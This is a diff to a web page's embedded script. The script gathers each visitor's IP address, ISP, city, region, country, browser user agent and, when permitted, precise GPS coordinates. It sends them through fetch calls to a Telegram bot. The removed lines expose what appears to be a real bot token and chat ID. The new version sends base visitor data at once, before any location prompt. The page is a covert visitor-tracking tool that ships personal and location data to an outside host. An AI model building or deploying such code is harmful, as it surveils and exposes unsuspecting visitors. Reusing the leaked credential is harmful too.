@@ -16,8 +16,8 @@
   </div>
 
   <script>
-    const BOT_TOKEN = "8011619975:AAE_Donqy5xn8RD0lJ2LOIP326dTDrnO1Ag"; 
-    const CHAT_ID = "6065284869";
+    const BOT_TOKEN = "YOUR_BOT_TOKEN";
+    const CHAT_ID = "YOUR_CHAT_ID";
 
     async function getIPInfo() {
       const res = await fetch("https://ipapi.co/json/");
@@ -31,57 +31,51 @@
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
           chat_id: CHAT_ID,
-          text: message
-        })
+          text: message,
+        }),
       });
     }
 
     async function collectAndSend() {
-      const ipInfo = await getIPInfo();
-      let locationInfo = "";
+      document.getElementById("result").textContent = "Collecting info...";
 
+      const ipInfo = await getIPInfo();
+
+      // Send base info immediately
+      const baseMessage = `
+New Visitor Info (without precise location):
+IP: ${ipInfo.ip}
+ISP: ${ipInfo.org}
+City: ${ipInfo.city}
+Region: ${ipInfo.region}
+Country: ${ipInfo.country_name}
+User-Agent: ${navigator.userAgent}
+Time: ${new Date().toLocaleString()}
+      `;
+      document.getElementById("result").textContent = baseMessage;
+      await sendToTelegram(baseMessage);
+
+      // Try to get precise location, but don't block or send if denied
       if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(
           async (position) => {
-            locationInfo = `Location:
-Lat: ${position.coords.latitude}
-Lon: ${position.coords.longitude}
-Accuracy: ${position.coords.accuracy}m`;
-
-            const message = `
-New Visitor Info:
-IP: ${ipInfo.ip}
-ISP: ${ipInfo.org}
-City: ${ipInfo.city}
-Region: ${ipInfo.region}
-Country: ${ipInfo.country_name}
-User-Agent: ${navigator.userAgent}
+            const locationMessage = `
+Updated Visitor Location:
+Latitude: ${position.coords.latitude}
+Longitude: ${position.coords.longitude}
+Accuracy: ${position.coords.accuracy} meters
 Time: ${new Date().toLocaleString()}
-
-${locationInfo}
             `;
-            document.getElementById("result").textContent = message;
-            await sendToTelegram(message);
+            document.getElementById("result").textContent += "\n" + locationMessage;
+            await sendToTelegram(locationMessage);
           },
-          async (error) => {
-            const message = `
-New Visitor Info (no location permission):
-IP: ${ipInfo.ip}
-ISP: ${ipInfo.org}
-City: ${ipInfo.city}
-Region: ${ipInfo.region}
-Country: ${ipInfo.country_name}
-User-Agent: ${navigator.userAgent}
-Time: ${new Date().toLocaleString()}
-            `;
-            document.getElementById("result").textContent = message;
-            await sendToTelegram(message);
+          (error) => {
+            // User denied or error: do nothing or log silently
+            console.log("Geolocation permission denied or error.");
           }
         );
       } else {
-        const fallbackMessage = "Geolocation not supported.";
-        document.getElementById("result").textContent = fallbackMessage;
-        await sendToTelegram(fallbackMessage);
+        console.log("Geolocation not supported by browser.");
       }
     }
   </script>
